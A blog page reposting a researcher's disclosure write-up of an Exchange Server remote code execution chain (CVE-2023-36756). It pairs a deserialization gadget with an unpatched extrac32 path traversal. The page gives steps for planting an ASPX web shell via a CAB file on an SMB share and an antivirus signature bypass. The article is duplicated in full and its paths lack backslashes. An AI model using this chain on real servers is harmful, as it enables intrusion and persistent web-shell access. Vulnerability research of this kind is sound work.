<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<style type=text/css>body{font-family:monospace;}</style>
	<title>Exploiting Exchange PowerShell After ProxyNotShell: Part 2 - ApprovedApplicationCollection</title>
	
	
	<link rel="stylesheet" href="/css/style.css">
	
	
</head>
<body>
	<header>
	==========================<br>
	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
	==========================
	<div style="float: right;">A Techi Personal Blog</div><br>
	<p>
	<nav>
			<a href="/"><b>Start</b></a>.
			
			
			<a href="/posts/"><b>Posts</b></a>.
			
			<a href="/categories/"><b>Categories</b></a>.
			
			<a href="/tags/"><b>Tags</b></a>.
			
	</nav>
	</p>
	
</header>

	
	<main>
		<article>
			<h1>Exploiting Exchange PowerShell After ProxyNotShell: Part 2 - ApprovedApplicationCollection</h1>
			<b><time>04.01.2025 00:00</time></b>
		       
		           <a href="/tags/cybersecurity">cybersecurity</a>
        	       
		           <a href="/tags/security">security</a>
        	       
		           <a href="/tags/zero_day">zero_day</a>
        	       
		           <a href="/tags/zeroday">zeroday</a>
        	       

			<div>
				<p>As you may know, I recently presented my Exchange-related talk during OffensiveCon 2024. This series of 4 blog posts is meant to supplement the talk and provide additional technical details. You can read the first post in this series here.</p>
<p>In part 2, I describe the <code>ApprovedApplicationCollection</code> gadget, which was available for abuse because it did not appear on the deny list and could therefore be accessed via <code>MultiValuedProperty</code>. I am also presenting a path traversal in the Windows utility <code>extrac32.exe</code>, which allowed me to complete the chain for a full RCE in Exchange. For the moment, at least, Microsoft has made a decision not to fix this path traversal bug.</p>
<p>You can watch the full talk here: “Half Measures and Full Compromise: Exploiting Microsoft Exchange PowerShell Remoting”. This blog post covers the part from 18:10 to 21:10.</p>
<p><strong>Introduction</strong></p>
<p>In the previous post, I described two RCE vulnerabilities, CVE-2023-21529 and CVE-2023-32031. In this post, I present the next RCE that found in Microsoft Exchange. It consists of a chain of two vulnerabilities:</p>
<p>• CVE-2023-36756 – a vulnerability in Exchange Server.<br>
• ZDI-CAN-21499 – an unpatched path traversal vulnerability in the Windows utility <code>extrac32.exe</code>.</p>
<p>Microsoft decided that ZDI-CAN-21499 would not be fixed as “Windows customers are not exposed to this vulnerability.” They also note that, in their view, “It is the caller&rsquo;s (the application using <code>extrac32</code>) responsibility to make sure <code>extrac32</code> is not called on untrusted CAB files.” As we will see in this article, though, the <code>extrac32</code> issue can be used to an attacker’s advantage.</p>
<p><strong>The Patch for CVE-2023-32031</strong></p>
<p>While Microsoft was dealing with the ProxyNotShell chain back in 2022, I took some time to look for different classes that could be abused to exploit PowerShell Remoting for some security impact, such as RCE, file disclosure, denial of service, or NTLM relaying. I found around 30 unique classes and reported them to Microsoft.</p>
<p>Those submissions were marked as duplicates and were ignored, which in my opinion was a mistake. The initial patch for the ProxyNotShell included an allow list, so it seems that the deficiencies in the separate deny list did not attract the attention it should. The problem became evident later when I discovered the vulnerable <code>MultiValuedProperty</code> class (CVE-2023-21529). This class was present on the allow list, and it allowed me to access a separate, internal deserialization mechanism not subject to the allow list sanitation. Even after the internal <code>MultiValuedProperty</code> deserialization mechanism was hardened by means of the deny list, I was able to easily abuse the classes that I had reported many months before, as they had not been added to the deny list. For example, I was able to use the <code>Command</code> class, as I described in the previous post. I had originally reported this class to Microsoft in September 2022, but I was able to reuse this class for CVE-2023-32031 almost seven months later because it did not appear on the deny list introduced in the patch for <code>MultiValuedProperty</code>.</p>
<p>To patch CVE-2023-32031, Microsoft expanded the deny list to include all the classes that I had previously in 2022. The patch went no further than that. Critically, it still did not introduce an allow list, so it was game on. All I had to do was find another class with security impact not included in the deny list, and then I could use <code>MultiValuedProperty</code> to deserialize it. This became my next challenge</p>
<p><strong>CVE-2023-36756 – ApprovedApplicationCollection</strong></p>
<p>I was looking for classes where something potentially malicious could be reached either through a single-argument constructor or a static <code>Parse(String)</code> method. This approach led me to the <code>Microsoft.Exchange.Data.Directory.SystemConfiguration.ApprovedApplicationCollection</code> class.</p>
<p>As you can see, we can deliver an object of any type to the constructor. The code flow can go in multiple directions from here.</p>
<p>We are interested in a case where a string is provided to the constructor. When a string is provided, the code expects it to be a valid path to a file with a <code>.cab</code> extension. The code does not validate the path in any meaningful way except for checking the extension. The code leads to the <code>ParseCab</code> method, where the argument contains the attacker-supplied path:</p>
<p>At <code>[1]</code>, a <code>FileInfo</code> object is created from the attacker’s path.</p>
<p>At <code>[2]</code> and <code>[3]</code>, a temporary output directory is created.</p>
<p>At <code>[4]</code>, the <code>OpenCabinetFile</code> method is called.</p>
<p>At <code>[5]</code>, the entire temporary directory is deleted.</p>
<p>At this stage, we can confirm two things. We can deliver a UNC path, such as <code>\192.168.1.100pocpoc.cab</code>. The Exchange PowerShell Remoting requires Kerberos authentication, so the attacker most likely resides in the internal network anyway. It is rather rare to see the SMB traffic filtered internally. Thus, in most cases it will not present a challenge for the attacker to host content that the Exchange server can access over SMB.</p>
<p>Next, our remote path is processed by <code>OpenCabinetFile</code>. Let’s analyze this method.</p>
<p>It seems that our cabinet file is going to be extracted with the following command:</p>
<p><code>extrac32.exe /Y /E /L “C:WindowsTemprandom-uuid” “\192.168.1.100pocpoc.cab”</code></p>
<p>Basically, the content of our remote CAB file will be extracted to some temporary directory. Then, the entire directory will be deleted. There does not seem to be any available unsafe operations here. As we will see, though, it turns out that <code>extrac32</code> has its own issues.</p>
<p><strong>ZDI-CAN-21499 – Unpatched Path Traversal in extrac32</strong></p>
<p>In general, we can use the <code>ApprovedApplicationCollection</code> internal Exchange class to extract our CAB file with the Windows utility <code>extrac32.exe</code>. This could lead to a file parsing bug, where the parsing part is performed by some unmanaged code. We could always try to look for memory corruptions in <code>extrac32.exe</code>. Before even thinking about it, I decided to go for a full-dumb option, which can be summarized with the following meme.</p>
<p>
<figure>
  <img src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/4a8f79be-74ed-4eb6-b555-5fa7a607e602/meme.png?format=1000w" alt="" />
</figure>


</p>
<p>I simply created a CAB containing a single file, where the filename contains the path traversal sequence <code>..</code>, and tested it.</p>
<p>
<figure>
  <img src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/6f1342f8-04bb-4b1e-a935-90cfeacbd094/Picture2.png?format=1000w" alt="" />
</figure>


</p>
<p>It turned out that the <code>extrac32</code> extraction mechanism is vulnerable to a trivial path traversal. There is still one problem, though. The file presented in the screenshot gets detected as malicious by Windows Defender:</p>
<p>
<figure>
  <img src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/f094805d-20d1-4150-895e-d2757961fbb6/Picture3.png?format=1000w" alt="" />
</figure>


</p>
<p>Luckily for the attackers, antivirus signatures are not always very smart, and this one can be easily bypassed. For example:</p>
<p><code>..poc.txt</code> - the CAB file gets tagged as malicious by Windows Defender.</p>
<p><code>../poc.txt</code> - the CAB file is seen as legitimate by Windows Defender.</p>
<p>I reported the path traversal vulnerability to Microsoft in June of 2023. After a short discussion, we received the following final response from the vendor:</p>
<p><em>“To clarify our earlier point – it is the caller&rsquo;s (application using <code>extrac32</code>) responsibility to make sure <code>extrac32</code> is not called on untrusted CAB files.”</em></p>
<p>To me, this does not seem sensible. It seems like the equivalent of asking people to manually verify the contents of a ZIP file before you unzip it with one of the available solutions. However, this was Microsoft’s final reply.</p>
<p>The upshot was that since Microsoft clearly stated that it is going to be Exchange’s fault for the way it uses <code>extrac32</code>, I could use this to get a CVE in Exchange.</p>
<p><strong>Chaining the Pieces</strong></p>
<p>The attacker needs to do the following to exploit this vulnerability:</p>
<p>-- Create a malicious CAB file that contains an ASPX web shell, with the file name set to something like <code>../../../../../../../../inetpub/wwwroot/poc.aspx</code>.<br>
-- Host this CAB file on an SMB share in the domain.<br>
-- Perform PowerShell Remoting deserialization, where:<br>
       &ndash; The target type is <code>MultiValuedProperty&lt;ApprovedApplicationCollection&gt;</code>.<br>
       &ndash; The argument is a UNC path pointing to our CAB file, such as: <code>\192.168.1.100pocpoc.cab</code>.<br>
-- Access the webshell and get code execution.</p>
<p>Fragment of the payload:</p>
<p>After this, you can enjoy your web shell.</p>
<p>
<figure>
  <img src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/848852d2-87de-4a10-b538-0dccab795668/Picture4.png?format=1000w" alt="" />
</figure>


</p>
<p>As always, I have prepared a demo that presents the entire exploitation process.</p>
<p><strong>Summary</strong></p>
<p>In this blog post, I have presented the CVE-2023-36756 vulnerability in Microsoft Exchange Server. It allowed any authenticated attacker to achieve remote code execution by uploading a web shell.</p>
<p>In my next blog post, part 3 of the Exchange PowerShell Remoting series, I am going to present my CVE-2023-36745 RCE vulnerability. To make it work, I had to prepare one of the craziest chains that I have ever made, so I am excited to share it with you. Once again, you can watch my entire OffensiveCon 2024 talk here.</p>
<p>Until my next post, you can follow me @chudypb and follow the team on Twitter, Mastodon, LinkedIn, Bluesky, or Instagram for the latest in exploit techniques and security patches.</p>
<p>As you may know, I recently presented my Exchange-related talk during OffensiveCon 2024. This series of 4 blog posts is meant to supplement the talk and provide additional technical details. You can read the first post in this series here.</p>
<p>In part 2, I describe the <code>ApprovedApplicationCollection</code> gadget, which was available for abuse because it did not appear on the deny list and could therefore be accessed via <code>MultiValuedProperty</code>. I am also presenting a path traversal in the Windows utility <code>extrac32.exe</code>, which allowed me to complete the chain for a full RCE in Exchange. For the moment, at least, Microsoft has made a decision not to fix this path traversal bug.</p>
<p>You can watch the full talk here: “Half Measures and Full Compromise: Exploiting Microsoft Exchange PowerShell Remoting”. This blog post covers the part from 18:10 to 21:10.</p>
<p><strong>Introduction</strong></p>
<p>In the previous post, I described two RCE vulnerabilities, CVE-2023-21529 and CVE-2023-32031. In this post, I present the next RCE that found in Microsoft Exchange. It consists of a chain of two vulnerabilities:</p>
<p>• CVE-2023-36756 – a vulnerability in Exchange Server.<br>
• ZDI-CAN-21499 – an unpatched path traversal vulnerability in the Windows utility <code>extrac32.exe</code>.</p>
<p>Microsoft decided that ZDI-CAN-21499 would not be fixed as “Windows customers are not exposed to this vulnerability.” They also note that, in their view, “It is the caller&rsquo;s (the application using <code>extrac32</code>) responsibility to make sure <code>extrac32</code> is not called on untrusted CAB files.” As we will see in this article, though, the <code>extrac32</code> issue can be used to an attacker’s advantage.</p>
<p><strong>The Patch for CVE-2023-32031</strong></p>
<p>While Microsoft was dealing with the ProxyNotShell chain back in 2022, I took some time to look for different classes that could be abused to exploit PowerShell Remoting for some security impact, such as RCE, file disclosure, denial of service, or NTLM relaying. I found around 30 unique classes and reported them to Microsoft.</p>
<p>Those submissions were marked as duplicates and were ignored, which in my opinion was a mistake. The initial patch for the ProxyNotShell included an allow list, so it seems that the deficiencies in the separate deny list did not attract the attention it should. The problem became evident later when I discovered the vulnerable <code>MultiValuedProperty</code> class (CVE-2023-21529). This class was present on the allow list, and it allowed me to access a separate, internal deserialization mechanism not subject to the allow list sanitation. Even after the internal <code>MultiValuedProperty</code> deserialization mechanism was hardened by means of the deny list, I was able to easily abuse the classes that I had reported many months before, as they had not been added to the deny list. For example, I was able to use the <code>Command</code> class, as I described in the previous post. I had originally reported this class to Microsoft in September 2022, but I was able to reuse this class for CVE-2023-32031 almost seven months later because it did not appear on the deny list introduced in the patch for <code>MultiValuedProperty</code>.</p>
<p>To patch CVE-2023-32031, Microsoft expanded the deny list to include all the classes that I had previously in 2022. The patch went no further than that. Critically, it still did not introduce an allow list, so it was game on. All I had to do was find another class with security impact not included in the deny list, and then I could use <code>MultiValuedProperty</code> to deserialize it. This became my next challenge</p>
<p><strong>CVE-2023-36756 – ApprovedApplicationCollection</strong></p>
<p>I was looking for classes where something potentially malicious could be reached either through a single-argument constructor or a static <code>Parse(String)</code> method. This approach led me to the <code>Microsoft.Exchange.Data.Directory.SystemConfiguration.ApprovedApplicationCollection</code> class.</p>
<p>As you can see, we can deliver an object of any type to the constructor. The code flow can go in multiple directions from here.</p>
<p>We are interested in a case where a string is provided to the constructor. When a string is provided, the code expects it to be a valid path to a file with a <code>.cab</code> extension. The code does not validate the path in any meaningful way except for checking the extension. The code leads to the <code>ParseCab</code> method, where the argument contains the attacker-supplied path:</p>
<p>At <code>[1]</code>, a <code>FileInfo</code> object is created from the attacker’s path.</p>
<p>At <code>[2]</code> and <code>[3]</code>, a temporary output directory is created.</p>
<p>At <code>[4]</code>, the <code>OpenCabinetFile</code> method is called.</p>
<p>At <code>[5]</code>, the entire temporary directory is deleted.</p>
<p>At this stage, we can confirm two things. We can deliver a UNC path, such as <code>\192.168.1.100pocpoc.cab</code>. The Exchange PowerShell Remoting requires Kerberos authentication, so the attacker most likely resides in the internal network anyway. It is rather rare to see the SMB traffic filtered internally. Thus, in most cases it will not present a challenge for the attacker to host content that the Exchange server can access over SMB.</p>
<p>Next, our remote path is processed by <code>OpenCabinetFile</code>. Let’s analyze this method.</p>
<p>It seems that our cabinet file is going to be extracted with the following command:</p>
<p><code>extrac32.exe /Y /E /L “C:WindowsTemprandom-uuid” “\192.168.1.100pocpoc.cab”</code></p>
<p>Basically, the content of our remote CAB file will be extracted to some temporary directory. Then, the entire directory will be deleted. There does not seem to be any available unsafe operations here. As we will see, though, it turns out that <code>extrac32</code> has its own issues.</p>
<p><strong>ZDI-CAN-21499 – Unpatched Path Traversal in extrac32</strong></p>
<p>In general, we can use the <code>ApprovedApplicationCollection</code> internal Exchange class to extract our CAB file with the Windows utility <code>extrac32.exe</code>. This could lead to a file parsing bug, where the parsing part is performed by some unmanaged code. We could always try to look for memory corruptions in <code>extrac32.exe</code>. Before even thinking about it, I decided to go for a full-dumb option, which can be summarized with the following meme.</p>
<p>
<figure>
  <img src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/4a8f79be-74ed-4eb6-b555-5fa7a607e602/meme.png?format=1000w" alt="" />
</figure>


</p>
<p>I simply created a CAB containing a single file, where the filename contains the path traversal sequence <code>..</code>, and tested it.</p>
<p>
<figure>
  <img src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/6f1342f8-04bb-4b1e-a935-90cfeacbd094/Picture2.png?format=1000w" alt="" />
</figure>


</p>
<p>It turned out that the <code>extrac32</code> extraction mechanism is vulnerable to a trivial path traversal. There is still one problem, though. The file presented in the screenshot gets detected as malicious by Windows Defender:</p>
<p>
<figure>
  <img src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/f094805d-20d1-4150-895e-d2757961fbb6/Picture3.png?format=1000w" alt="" />
</figure>


</p>
<p>Luckily for the attackers, antivirus signatures are not always very smart, and this one can be easily bypassed. For example:</p>
<p><code>..poc.txt</code> - the CAB file gets tagged as malicious by Windows Defender.</p>
<p><code>../poc.txt</code> - the CAB file is seen as legitimate by Windows Defender.</p>
<p>I reported the path traversal vulnerability to Microsoft in June of 2023. After a short discussion, we received the following final response from the vendor:</p>
<p><em>“To clarify our earlier point – it is the caller&rsquo;s (application using <code>extrac32</code>) responsibility to make sure <code>extrac32</code> is not called on untrusted CAB files.”</em></p>
<p>To me, this does not seem sensible. It seems like the equivalent of asking people to manually verify the contents of a ZIP file before you unzip it with one of the available solutions. However, this was Microsoft’s final reply.</p>
<p>The upshot was that since Microsoft clearly stated that it is going to be Exchange’s fault for the way it uses <code>extrac32</code>, I could use this to get a CVE in Exchange.</p>
<p><strong>Chaining the Pieces</strong></p>
<p>The attacker needs to do the following to exploit this vulnerability:</p>
<p>-- Create a malicious CAB file that contains an ASPX web shell, with the file name set to something like <code>../../../../../../../../inetpub/wwwroot/poc.aspx</code>.<br>
-- Host this CAB file on an SMB share in the domain.<br>
-- Perform PowerShell Remoting deserialization, where:<br>
       &ndash; The target type is <code>MultiValuedProperty&lt;ApprovedApplicationCollection&gt;</code>.<br>
       &ndash; The argument is a UNC path pointing to our CAB file, such as: <code>\192.168.1.100pocpoc.cab</code>.<br>
-- Access the webshell and get code execution.</p>
<p>Fragment of the payload:</p>
<p>After this, you can enjoy your web shell.</p>
<p>
<figure>
  <img src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/848852d2-87de-4a10-b538-0dccab795668/Picture4.png?format=1000w" alt="" />
</figure>


</p>
<p>As always, I have prepared a demo that presents the entire exploitation process.</p>
<p><strong>Summary</strong></p>
<p>In this blog post, I have presented the CVE-2023-36756 vulnerability in Microsoft Exchange Server. It allowed any authenticated attacker to achieve remote code execution by uploading a web shell.</p>
<p>In my next blog post, part 3 of the Exchange PowerShell Remoting series, I am going to present my CVE-2023-36745 RCE vulnerability. To make it work, I had to prepare one of the craziest chains that I have ever made, so I am excited to share it with you. Once again, you can watch my entire OffensiveCon 2024 talk here.</p>
<p>Until my next post, you can follow me @chudypb and follow the team on Twitter, Mastodon, LinkedIn, Bluesky, or Instagram for the latest in exploit techniques and security patches.</p>
<p>Go to Source</p>

			</div>
		</article>
	</main>
<aside>
	<div>
		<div>
			<h3>LATEST POSTS</h3>
		</div>
		<div>
			<ul>
				
				<li><a href="/posts/apple-inc-sent-you-a-payment-request-payoneer-invoices-other-microsoft-enabled-scams/">“Apple Inc sent you a payment request” Payoneer invoices; other Microsoft-enabled scams</a></li>
				
				<li><a href="/posts/5-best-linux-centos-replacement-options-alternatives/">&lt;div&gt;5 Best Linux CentOS Replacement Options &amp; Alternatives&lt;/div&gt;</a></li>
				
				<li><a href="/posts/crm-database-explained-definition-benefits-best-practices/">&lt;div&gt;CRM Database Explained: Definition, Benefits &amp; Best Practices&lt;/div&gt;</a></li>
				
				<li><a href="/posts/crm-reports-key-features-benefits-how-to-create-them/">&lt;div&gt;CRM Reports: Key Features, Benefits &amp; How to Create Them&lt;/div&gt;</a></li>
				
				<li><a href="/posts/iphone-android-users-a-major-privacy-upgrade-is-coming-soon/">&lt;div&gt;iPhone &amp; Android Users: A Major Privacy Upgrade is Coming Soon&lt;/div&gt;</a></li>
				
			</ul>
		</div>
	</div>
</aside>


	<footer>
	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
	<a href="https://github.com/Gharib110"><b>Github</b></a>.
	</p>
</footer>

</body>
</html>
